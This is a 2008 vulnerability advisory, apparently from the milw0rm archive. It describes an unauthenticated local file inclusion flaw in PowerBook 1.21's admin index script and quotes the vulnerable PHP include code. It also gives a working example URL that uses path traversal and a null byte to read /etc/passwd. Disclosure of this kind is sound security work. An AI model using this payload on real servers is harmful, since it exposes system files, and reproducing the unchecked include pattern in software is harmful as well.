@@ -1,0 +1,65 @@
+[DSECRG-08-019] Digital Security Research Group [DSecRG] Advisory
+
+
+Application:                    PowerBook
+Versions Affected:              1.21
+Vendor URL:                     http://www.powerscripts.org/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       01.02.2008
+Vendor Response:                none
+Solution:                       none
+Date of Public Advisory:        24.03.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Local File Include vulnerability found in script pb_inc/admincenter/index.php
+
+Non-authentication user can directly access to this script.
+
+To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.
+
+
+Code
+****
+#################################################
+
+  if (!$page) {
+     $page = "home";
+  }
+
+  $page .= ".inc.php";
+
+  if(file_exists($page) == false) {
+     echo "
+        <div align=\"center\">Sorry, the page <b>$page</b> does not exist!</div>
+     ";
+  } else {
+     include("$page");
+  }
+
+#################################################
+
+
+Example:
+
+http://[server]/[installdir]/pb_inc/admincenter/index.php?page=../../../../../../../../../../../../../etc/passwd%00
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration
+
+testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories
+
+and whitepapers posted regularly on our website.
+
+# milw0rm.com [2008-03-24]
